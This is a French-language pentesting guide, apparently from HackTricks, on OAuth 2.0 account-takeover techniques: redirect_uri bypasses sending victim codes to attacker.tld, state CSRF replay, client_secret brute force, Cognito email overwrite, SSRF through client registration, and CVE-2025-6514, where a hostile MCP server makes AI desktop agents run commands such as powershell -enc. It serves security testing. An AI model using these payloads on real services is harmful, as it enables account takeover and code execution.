# OAuth vers la prise de contrôle de compte

{{#include ../banners/hacktricks-training.md}}

## Informations de base <a href="#d4a8" id="d4a8"></a>

OAuth offre plusieurs versions, avec des informations de base accessibles sur [OAuth 2.0 documentation](https://oauth.net/2/). Cette discussion se concentre principalement sur le [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), fournissant un **cadre d’autorisation qui permet à une application d’accéder à ou d’effectuer des actions sur le compte d’un utilisateur dans une autre application** (le authorization server).

Considérez un site hypothétique _**https://example.com**_, conçu pour **afficher tous vos posts sur les réseaux sociaux**, y compris les posts privés. Pour cela, OAuth 2.0 est utilisé. _https://example.com_ demandera votre permission pour **accéder à vos posts sur les réseaux sociaux**. En conséquence, un écran de consentement apparaîtra sur _https://socialmedia.com_, indiquant les **permissions demandées et le développeur qui effectue la demande**. Après votre autorisation, _https://example.com_ obtient la capacité de **consulter vos posts en votre nom**.

Il est essentiel de comprendre les composants suivants dans le cadre OAuth 2.0 :

- **resource owner**: Vous, en tant qu’**utilisateur/entité**, autorisez l’accès à votre ressource, comme les posts de votre compte sur les réseaux sociaux.
- **resource server**: Le **serveur qui gère les requêtes authentifiées** une fois que l’application a obtenu un `access_token` au nom du `resource owner`, par ex. **https://socialmedia.com**.
- **client application**: L’**application qui cherche à obtenir l’autorisation** du `resource owner`, telle que **https://example.com**.
- **authorization server**: Le **serveur qui émet les `access_tokens`** à la `client application` après l’authentification réussie du `resource owner` et l’obtention de l’autorisation, par ex. **https://socialmedia.com**.
- **client_id**: Un identifiant public et unique pour l’application.
- **client_secret:** Une clé confidentielle, connue uniquement de l’application et du authorization server, utilisée pour générer des `access_tokens`.
- **response_type**: Une valeur spécifiant **le type de token demandé**, comme `code`.
- **scope**: Le **niveau d’accès** que la `client application` demande au `resource owner`.
- **redirect_uri**: L’**URL vers laquelle l’utilisateur est redirigé après l’autorisation**. Elle doit généralement correspondre à l’URL de redirection pré-enregistrée.
- **state**: Un paramètre pour **conserver des données lors de la redirection de l’utilisateur vers et depuis le authorization server**. Son caractère unique est crucial pour servir de **mécanisme de protection CSRF**.
- **grant_type**: Un paramètre indiquant **le type de grant et le type de token à retourner**.
- **code**: Le code d’autorisation émis par le `authorization server`, utilisé conjointement avec `client_id` et `client_secret` par la client application pour obtenir un `access_token`.
- **access_token**: Le **token que la client application utilise pour les requêtes API** au nom du `resource owner`.
- **refresh_token**: Permet à l’application d’**obtenir un nouveau `access_token` sans redemander l’utilisateur**.

### Flux

Le **flux OAuth réel** se déroule comme suit :

1. Vous naviguez vers [https://example.com](https://example.com) et sélectionnez le bouton “Integrate with Social Media”.
2. Le site envoie ensuite une requête à [https://socialmedia.com](https://socialmedia.com) demandant votre autorisation pour permettre à l’application de https://example.com d’accéder à vos posts. La requête est structurée comme :
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. On vous présente alors une page de consentement.
4. Après votre approbation, Social Media envoie une réponse au `redirect_uri` avec les paramètres `code` et `state` :
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com utilise ce `code`, ainsi que son `client_id` et son `client_secret`, pour effectuer une requête côté serveur afin d'obtenir un `access_token` en votre nom, permettant d'accéder aux autorisations auxquelles vous avez consenti :
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Enfin, le processus se conclut lorsque https://example.com utilise votre `access_token` pour effectuer un appel API vers Social Media afin d'accéder à

## Vulnerabilities <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), le serveur d'autorisation doit rediriger le navigateur uniquement vers des **pre-registered, exact redirect URIs**. Toute faiblesse ici permet à un attaquant d'induire une victime à suivre une authorization URL malveillante de sorte que l'IdP délivre le `code` (et le `state`) de la victime directement à un endpoint contrôlé par l'attaquant, qui peut alors l'échanger et récupérer des tokens.

Flux d'attaque typique :

1. Construire `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` et l'envoyer à la victime.
2. La victime s'authentifie et approuve les scopes.
3. L'IdP redirige vers `attacker.tld/callback?code=<victim-code>&state=...` où l'attaquant journalise la requête et échange immédiatement le code.

Bugs de validation courants à tester :

- **Aucune validation** – toute URL absolue est acceptée, entraînant le vol instantané du code.
- **Vérifications faibles (substring/regex) sur l'hôte** – contournement avec des domaines trompeurs tels que `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, ou `match.com@evil.com`.
- **Incohérences homographes IDN** – la validation se fait sur la forme punycode (`xn--`), mais le navigateur redirige vers le domaine Unicode contrôlé par l'attaquant.
- **Chemins arbitraires sur un hôte autorisé** – pointer `redirect_uri` vers `/openredirect?next=https://attacker.tld` ou tout endpoint XSS/contenu utilisateur transmet le code soit via des redirections en chaîne, l'en-tête Referer, ou du JavaScript injecté.
- **Contraintes de répertoire sans normalisation** – des patterns comme `/oauth/*` peuvent être contournés avec `/oauth/../anything`.
- **Sous-domaines génériques (wildcard)** – accepter `*.example.com` signifie que toute takeover (dangling DNS, S3 bucket, etc.) fournit immédiatement un callback valide.
- **Callbacks non-HTTPS** – autoriser des URI `http://` donne aux attaquants réseau (Wi‑Fi, proxy d'entreprise) l'occasion d'intercepter le code en transit.

Passez aussi en revue les paramètres auxiliaires de type redirect (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, etc.) et le document de découverte OpenID (`/.well-known/openid-configuration`) pour d'autres endpoints susceptibles d'hériter des mêmes bugs de validation.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Comme mentionné dans ce rapport bug bounty [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html), il se peut que l'URL de redirection **soit reflétée dans la réponse** du serveur après que l'utilisateur s'est authentifié, étant **vulnérable à XSS**. Payload possible à tester :
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Mauvaise gestion du paramètre `state` <a href="#bda5" id="bda5"></a>

Le paramètre `state` est le CSRF token du flow Authorization Code : le client doit générer une **valeur cryptographiquement aléatoire par instance de navigateur**, la persister quelque part que seul ce navigateur peut lire (cookie, local storage, etc.), l’envoyer dans la requête d’autorisation, et rejeter toute réponse qui ne renvoie pas la même valeur. Dès que la valeur est statique, prévisible, optionnelle, ou non liée à la session de l’utilisateur, l’attaquant peut terminer son propre flow OAuth, capturer la requête finale contenant `?code=` (sans l’envoyer), puis forcer ultérieurement un navigateur victime à rejouer cette requête pour lier le compte de la victime au profil de l’attaquant chez l’IdP.

Le pattern de replay est toujours le même :

1. L’attaquant s’authentifie auprès de l’IdP avec son compte et intercepte le dernier redirect contenant `code` (et éventuellement `state`).
2. Il abandonne cette requête, conserve l’URL, et abuse ensuite d’un primitive CSRF (lien, iframe, formulaire auto-soumis) pour forcer le navigateur victime à la charger.
3. Si le client n’applique pas `state`, l’application consomme le résultat d’autorisation de l’attaquant et connecte l’attaquant au compte de l’application de la victime.

Checklist pratique pour la gestion de `state` pendant les tests :

- **Absence totale de `state`** – si le paramètre n’apparaît jamais, tout le login est sujet à CSRF.
- **`state` non requis** – retirez-le de la requête initiale ; si l’IdP délivre quand même des codes que le client accepte, la défense est opt-in.
- **`state` retourné non validé** – manipulez la valeur dans la réponse (Burp, MITM proxy). Accepter des valeurs non concordantes signifie que le token stocké n’est jamais comparé.
- **`state` prévisible ou purement basé sur des données** – beaucoup d’apps insèrent des chemins de redirect ou des blobs JSON dans `state` sans y mélanger d’entropie, permettant aux attaquants de deviner des valeurs valides et de rejouer les flows. Préfixez/suffixez toujours les données par une forte entropie avant encodage.
- **Fixation de `state`** – si l’app permet aux utilisateurs de fournir la valeur `state` (ex. via des URLs d’autorisation construites) et la réutilise tout au long du flow, un attaquant peut verrouiller une valeur connue et la réutiliser contre plusieurs victimes.

PKCE peut compléter `state` (particulièrement pour les public clients) en liant le code d’autorisation à un code verifier, mais les clients web doivent toujours suivre `state` pour prévenir les bugs CSRF/de liaison de compte cross-utilisateur.

### Avant l'usurpation de compte <a href="#ebe4" id="ebe4"></a>

1. **Sans vérification d’e-mail lors de la création de compte** : des attaquants peuvent créer proactivement un compte en utilisant l’adresse e-mail de la victime. Si la victime utilise ensuite un service tiers pour se connecter, l’application peut involontairement lier ce compte tiers au compte pré-créé de l’attaquant, entraînant un accès non autorisé.
2. **Exploitation d’une vérification d’e-mail laxiste sur OAuth** : des attaquants peuvent abuser de services OAuth qui ne vérifient pas les e-mails en s’enregistrant puis en changeant l’e-mail du compte pour celui de la victime. Cette méthode présente un risque d’accès non autorisé, similaire au premier scénario mais via un vecteur différent.

### Divulgation de secrets <a href="#e177" id="e177"></a>

Le `client_id` est intentionnellement public, mais le **`client_secret` ne doit jamais être récupérable par les utilisateurs finaux**. Les déploiements Authorization Code qui embarquent le secret dans des **APKs mobiles, clients desktop, ou single-page apps** remettent effectivement ce credential à quiconque peut télécharger le package. Inspectez toujours les public clients en :

- Dépaquetant l’APK/IPA, l’installateur desktop, ou l’app Electron et en greppant pour `client_secret`, des blobs Base64 décodant en JSON, ou des endpoints OAuth codés en dur.
- Revue des fichiers de config inclus (plist, JSON, XML) ou des chaînes décompilées à la recherche de credentials client.

Une fois que l’attaquant extrait le secret, il lui suffit de voler n’importe quel `code` d’autorisation d’une victime (via un `redirect_uri` faible, des logs, etc.) pour frapper `/token` de façon indépendante et mint des access/refresh tokens sans impliquer l’app légitime. Traitez les public/native clients comme **incapables de garder des secrets** — ils doivent plutôt s’appuyer sur PKCE (RFC 7636) pour prouver la possession d’un code verifier par instance au lieu d’un secret statique. Pendant les tests, vérifiez si PKCE est obligatoire et si le backend rejette effectivement les échanges de token qui omettent soit le `client_secret` **ou** un `code_verifier` valide.

### Bruteforce du `client_secret`

Vous pouvez essayer de **bruteforcer le `client_secret`** d’un fournisseur de service ou de l’identity provider afin d’essayer de voler des comptes.  
La requête pour le BF peut ressembler à :
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer/Header/Location artifacts leaking Code + State

Une fois que le client possède le **code and state**, s'ils apparaissent dans **`location.href`** ou **`document.referrer`** et sont transmis à des tiers, ils leak. Deux schémas récurrents :

- **Classic Referer leak** : après le OAuth redirect, toute navigation qui conserve `?code=&state=` dans l'URL poussera ces valeurs dans l'en-tête **Referer** envoyé aux CDNs/analytics/ads.
- **Telemetry/analytics confused deputy** : certains SDKs (pixels/JS loggers) réagissent aux événements `postMessage` puis **envoient le `location.href`/`referrer` courant aux backend APIs en utilisant un token fourni dans le message**. Si vous pouvez injecter votre propre token dans ce flux (p.ex. via un relais postMessage contrôlé par l'attaquant), vous pouvez ensuite lire l'historique/logs des requêtes API du SDK et récupérer les artifacts OAuth de la victime inclus dans ces requêtes.


### Access Token Stored in Browser History

La garantie centrale du Authorization Code grant est que les access tokens n'atteignent jamais le navigateur du resource owner. Quand des implémentations leak tokens côté client, n'importe quel bug mineur (XSS, Referer leak, proxy logging) devient une compromission de compte instantanée. Vérifiez toujours :

- **Tokens in URLs** – si `access_token` apparaît dans la query/fragment, il finit dans l'historique du navigateur, les logs serveur, l'analytics, et les en-têtes Referer envoyés à des tiers.
- **Tokens transiting untrusted middleboxes** – renvoyer des tokens sur HTTP ou via des proxies de debugging/corporate permet aux observateurs réseau de les capturer directement.
- **Tokens stored in JavaScript state** – les stores React/Vue, les variables globales ou les blobs JSON sérialisés exposent les tokens à tous les scripts de l'origine (y compris payloads XSS ou extensions malveillantes).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` conservent les tokens longtemps après le logout sur des machines partagées et sont accessibles par script.

N'importe laquelle de ces découvertes transforme généralement des bugs autrement «faibles» (comme un CSP bypass ou un DOM XSS) en prise de contrôle complète de l'API parce que l'attaquant peut simplement lire et rejouer le leaked bearer token.

### Everlasting Authorization Code

Authorization codes doivent être short-lived, single-use, et replay-aware. Lors de l'évaluation d'un flow, capturez un `code` et :

- **Test the lifetime** – RFC 6749 recommande des minutes, pas des heures. Essayez d'échanger le code après 5–10 minutes ; s'il fonctionne encore, la fenêtre d'exposition pour tout code leaked est excessive.
- **Test sequential reuse** – envoyez le même `code` deux fois. Si la seconde requête fournit un autre token, les attaquants peuvent cloner des sessions indéfiniment.
- **Test concurrent redemption/race conditions** – lancez deux requêtes de token en parallèle (Burp intruder, turbo intruder). Les émetteurs faibles accordent parfois les deux.
- **Observe replay handling** – une tentative de reuse ne devrait pas seulement échouer mais aussi révoquer tout token déjà émis à partir de ce code. Sinon, un replay détecté laisse le premier token de l'attaquant actif.

Combiner un code permissif au replay avec n'importe quel redirect_uri ou bug de logging permet un accès persistant au compte même après que la victime ait terminé la connexion légitime.

### Authorization/Refresh Token not bound to client

Si vous pouvez obtenir l'authorization code et l'échanger pour un autre client/app, vous pouvez takeover d'autres comptes. Testez la faible liaison en :

- Capturant un `code` pour **app A** et l'envoyant au **token endpoint** de **app B** ; si vous recevez quand même un token, audience binding est cassé.
- Testant les endpoints de minting de tokens first-party qui devraient être restreints à leurs propres client IDs ; s'ils acceptent des `state`/`app_id` arbitraires tout en ne validant que le code, vous effectuez effectivement un **authorization-code swap** pour mint des tokens first-party à privilèges supérieurs.
- Vérifiant si le client binding ignore les mismatches de nonce/redirect URI. Si une page d'erreur charge quand même des SDKs qui loggent `location.href`, combinez avec Referer/telemetry leaks pour voler des codes et les échanger ailleurs.

Tout endpoint qui échange `code` → token **must** vérifier le client émetteur, le redirect URI, et le nonce ; sinon, un code volé depuis n'importe quelle app peut être upgradé en un access token first-party.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) you can see that the **token** that **AWS Cognito** gives back to the user might have **enough permissions to overwrite the user data**. Therefore, if you can **change the user email for a different user email**, you might be able to **take over** others accounts.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Pour plus d'informations détaillées sur la manière d'abuser d'AWS Cognito, consultez [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Abuser des tokens d'autres applications <a href="#bda5" id="bda5"></a>

Comme indiqué dans [**this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), les flows OAuth qui s'attendent à recevoir le **token** (et non un code) peuvent être vulnérables s'ils ne vérifient pas que le token appartient à l'app.

Ceci s'explique par le fait qu'un **attaquant** pourrait créer une **application supportant OAuth et se connectant via Facebook** (par exemple) dans sa propre application. Ensuite, une fois qu'une victime se connecte avec Facebook dans l'application de l'**attaquant**, l'attaquant pourrait obtenir le **OAuth token de l'utilisateur** fourni à son application, et l'utiliser pour se connecter dans l'application OAuth de la victime en utilisant le token de l'utilisateur victime.

> [!CAUTION]
> Par conséquent, si l'attaquant parvient à faire accéder l'utilisateur à sa propre application OAuth, il pourra prendre le contrôle du compte de la victime dans les applications qui attendent un token et ne vérifient pas si le token a été accordé à leur app ID.

### Two links & cookie <a href="#bda5" id="bda5"></a>

Selon [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), il était possible de faire ouvrir à une victime une page avec un **returnUrl** pointant vers l'hôte de l'attaquant. Cette information serait **stockée dans un cookie (RU)** et, à une **étape ultérieure**, le **prompt** demandera à l'**utilisateur** s'il souhaite donner l'accès à cet hôte de l'attaquant.

Pour contourner ce prompt, il était possible d'ouvrir un onglet pour initier le **Oauth flow** qui définirait ce cookie RU en utilisant le **returnUrl**, de fermer l'onglet avant que le prompt ne s'affiche, puis d'ouvrir un nouvel onglet sans cette valeur. Ensuite, le **prompt n'informera pas sur l'hôte de l'attaquant**, mais le cookie aurait été défini vers cet hôte, de sorte que le **token sera envoyé à l'hôte de l'attaquant** lors de la redirection.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

Comme expliqué dans [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), certaines implémentations OAuth permettent d'indiquer le paramètre GET **`prompt`** comme None (**`&prompt=none`**) pour **empêcher que les utilisateurs soient invités à confirmer** l'accès donné via un prompt sur le web s'ils sont déjà connectés sur la plateforme.

### response_mode

Comme [**expliqué dans cette vidéo**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), il peut être possible d'indiquer le paramètre **`response_mode`** pour indiquer où vous voulez que le code soit fourni dans l'URL finale :

- `response_mode=query` -> Le code est fourni dans un paramètre GET : `?code=2397rf3gu93f`
- `response_mode=fragment` -> Le code est fourni dans le fragment de l'URL `#code=2397rf3gu93f`
- `response_mode=form_post` -> Le code est fourni dans un formulaire POST avec un input appelé `code` et la valeur
- `response_mode=web_message` -> Le code est envoyé dans un post message : `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking des dialogues de consentement OAuth

Les dialogues de consentement/login OAuth sont des cibles idéales pour le clickjacking : s'ils peuvent être encadrés, un attaquant peut superposer des éléments graphiques personnalisés, cacher les vrais boutons, et tromper les utilisateurs pour qu'ils approuvent des scopes dangereux ou lient des comptes. Construisez des PoC qui :

1. Chargent l'URL d'autorisation IdP à l'intérieur d'un `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Utilisent du positionnement absolu/astuces d'opacité pour aligner des faux boutons avec les contrôles cachés **Allow**/**Approve**.
3. Éventuellement pré-remplissent des paramètres (scopes, redirect URI) afin que l'approbation volée profite immédiatement à l'attaquant.

Lors des tests, vérifiez que les pages IdP émettent soit `X-Frame-Options: DENY/SAMEORIGIN`, soit une `Content-Security-Policy: frame-ancestors 'none'` restrictive. Si aucune n'est présente, démontrez le risque avec des outils comme [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) et enregistrez la facilité avec laquelle une victime autorise l'app de l'attaquant. Pour d'autres idées de payloads voir [Clickjacking](clickjacking.md).

### OAuth ROPC flow - contournement du 2FA <a href="#b440" id="b440"></a>

Selon [**ce billet de blog**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), il s'agit d'un flow OAuth qui permet de se connecter via **username** et **password**. Si, durant ce flow simple, un **token** avec accès à toutes les actions que l'utilisateur peut exécuter est retourné, il est alors possible de contourner le 2FA en utilisant ce token.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

Ce [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) explique comment il était possible d'abuser d'un **open redirect** vers la valeur du **referrer** pour abuser OAuth et aboutir à un ATO. L'attaque était :

1. La victime accède à la page web de l'attaquant
2. La victime ouvre le lien malveillant et un opener démarre le flow Google OAuth avec `response_type=id_token,code&prompt=none` comme paramètres additionnels en utilisant comme **referrer le site de l'attaquant**.
3. Dans l'opener, après que le provider autorise la victime, il la renvoie vers la valeur du paramètre `redirect_uri` (site de la victime) avec un code 30X qui conserve encore le site de l'attaquant dans le referer.
4. Le site de la victime **déclenche l'open redirect basé sur le referrer** redirigeant l'utilisateur victime vers le site de l'attaquant ; comme le **`respose_type`** était **`id_token,code`**, le code sera renvoyé à l'attaquant dans le **fragment** de l'URL lui permettant de prendre le contrôle du compte de l'utilisateur via Google sur le site de la victime.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

Dynamic Client Registration en OAuth sert de vecteur moins évident mais critique pour des vulnérabilités de sécurité, en particulier pour les attaques **Server-Side Request Forgery (SSRF)**. Cet endpoint permet aux serveurs OAuth de recevoir des détails sur les applications clientes, y compris des URLs sensibles qui pourraient être exploitées.

Points clés :

- **Dynamic Client Registration** est souvent mappé sur `/register` et accepte des détails comme `client_name`, `client_secret`, `redirect_uris`, et des URLs pour les logos ou les JSON Web Key Sets (JWKs) via des requêtes POST.
- Cette fonctionnalité adhère aux spécifications décrites dans **RFC7591** et **OpenID Connect Registration 1.0**, qui incluent des paramètres potentiellement vulnérables au SSRF.
- Le processus d'enregistrement peut involontairement exposer les serveurs au SSRF de plusieurs façons :
  - **`logo_uri`** : une URL pour le logo de l'application cliente qui pourrait être récupérée par le serveur, déclenchant un SSRF ou conduisant à du XSS si l'URL est mal gérée.
  - **`jwks_uri`** : une URL vers le document JWK du client, qui, si elle est malveillante, peut pousser le serveur à faire des requêtes sortantes vers un serveur contrôlé par l'attaquant.
  - **`sector_identifier_uri`** : référence un tableau JSON de `redirect_uris`, que le serveur pourrait récupérer, créant une opportunité SSRF.
  - **`request_uris`** : liste les request URIs autorisées pour le client, qui peuvent être exploitées si le serveur récupère ces URIs au début du processus d'autorisation.

Stratégie d'exploitation :

- Le SSRF peut être déclenché en enregistrant un nouveau client avec des URLs malveillantes dans des paramètres comme `logo_uri`, `jwks_uri`, ou `sector_identifier_uri`.
- Alors que l'exploitation directe via `request_uris` peut être atténuée par des contrôles de whitelist, fournir un `request_uri` pré-enregistré, contrôlé par l'attaquant, peut faciliter le SSRF pendant la phase d'autorisation.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

La recherche sur [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (impactant des clients `mcp-remote` tels que Claude Desktop, Cursor ou Windsurf) montre comment la discovery OAuth dynamique devient une primitive RCE chaque fois que le client transmet les metadata IdP directement au système d'exploitation. Le serveur MCP distant retourne un `authorization_endpoint` contrôlé par l'attaquant lors de l'échange de discovery (`/.well-known/openid-configuration` ou n'importe quel RPC de metadata). `mcp-remote ≤0.1.15` appelait alors le gestionnaire d'URL du système (`start`, `open`, `xdg-open`, etc.) avec n'importe quelle chaîne reçue, de sorte que tout scheme/chemin supporté par l'OS s'exécutait localement.

Flux d'attaque

1. Pointer l'agent desktop vers un serveur MCP/OAuth hostile (`npx mcp-remote https://evil`). L'agent reçoit un `401` plus des metadata.
2. Le serveur répond avec du JSON tel que :
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. Le client lance le gestionnaire OS pour l'URI fourni. Windows accepte des payloads comme `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."` ; macOS/Linux acceptent `file:///Applications/Calculator.app/...` ou même des schemes personnalisés tels que `cmd://bash -lc '<payload>'` s'ils sont enregistrés.
4. Parce que cela se produit avant toute interaction utilisateur, **le simple fait de configurer le client pour qu'il parle au serveur de l'attaquant permet l'exécution de code**.

**Comment tester**

- Ciblez tout desktop/agent capable d'OAuth qui effectue la discovery sur HTTP(S) et ouvre localement les endpoints retournés (Electron apps, CLI helpers, thick clients).
- Interceptez ou hébergez la réponse de discovery et remplacez `authorization_endpoint`, `device_authorization_endpoint`, ou des champs similaires par `file://`, `cmd://`, des chemins UNC, ou d'autres schemes dangereux.
- Observez si le client valide le scheme/host. L'absence de validation entraîne une exécution immédiate dans le contexte de l'utilisateur et prouve le problème.
- Répétez avec différents schemes pour cartographier l'intégralité de la surface d'attaque (p. ex., `ms-excel:`, `data:text/html,`, custom protocol handlers) et démontrer la portée cross-platform.

## OAuth providers Race Conditions

Si la plateforme que vous testez est un fournisseur OAuth [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

En OAuth, le champ sub identifie de manière unique un utilisateur, mais son format varie selon l'Authorization Server. Pour standardiser l'identification des utilisateurs, certains clients utilisent des emails ou des user handles. Cependant, cela est risqué car :

- Certains Authorization Servers n'assurent pas que ces propriétés (comme l'email) restent immuables.
- Dans certaines implémentations — comme **"Login with Microsoft"** — le client se base sur le champ email, qui est **contrôlé par l'utilisateur dans Entra ID** et non vérifié.
- Un attaquant peut exploiter cela en créant sa propre organisation Azure AD (p. ex., doyensectestorg) et en l'utilisant pour effectuer un Microsoft login.
- Même si l'Object ID (stocké dans sub) est immuable et sécurisé, la dépendance à un champ email mutable peut permettre un account takeover (par exemple, le détournement d'un compte tel que victim@gmail.com).

## Client Confusion Attack

Dans une **Client Confusion Attack**, une application utilisant l'OAuth Implicit Flow ne vérifie pas que le access token final a été spécifiquement généré pour son propre Client ID. Un attaquant monte un site public qui utilise l'OAuth Implicit Flow de Google, trompant des milliers d'utilisateurs pour qu'ils se connectent et récoltant ainsi des access tokens destinés au site de l'attaquant. Si ces utilisateurs ont également des comptes sur un autre site vulnérable qui ne valide pas le Client ID du token, l'attaquant peut réutiliser les tokens récoltés pour usurper les victimes et prendre le contrôle de leurs comptes.

## Scope Upgrade Attack

Le type **Authorization Code Grant** implique une communication serveur-à-serveur sécurisée pour la transmission des données utilisateur. Cependant, si l'Authorization Server fait implicitement confiance à un paramètre scope dans l'Access Token Request (un paramètre non défini dans la RFC), une application malveillante pourrait augmenter les privilèges d'un authorization code en demandant un scope plus élevé. Une fois l'Access Token généré, le Resource Server doit le vérifier : pour les tokens JWT, cela implique de vérifier la signature JWT et d'extraire des données telles que client_id et scope, tandis que pour des tokens sous forme de chaînes aléatoires, le serveur doit interroger l'Authorization Server pour récupérer les détails du token.

## Redirect Scheme Hijacking

Dans les implémentations OAuth mobiles, les apps utilisent des **custom URI schemes** pour recevoir les redirects contenant les Authorization Codes. Cependant, comme plusieurs apps peuvent enregistrer le même scheme sur un appareil, l'hypothèse selon laquelle seul le client légitime contrôle le redirect URI est violée. Sur Android, par exemple, un Intent URI comme `com.example.app://` oauth est capté en fonction du scheme et des filtres optionnels définis dans l'intent-filter d'une app. Comme la résolution d'intent d'Android peut être large — surtout si seul le scheme est spécifié — un attaquant peut enregistrer une app malveillante avec un intent filter soigneusement conçu pour détourner l'authorization code. Cela peut **permettre un account takeover** soit via l'interaction utilisateur (lorsque plusieurs apps sont éligibles pour gérer l'intent), soit via des techniques de contournement exploitant des filtres trop permissifs, comme détaillé par le flowchart d'évaluation d'Ostorlab.

## Références

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)

{{#include ../banners/hacktricks-training.md}}
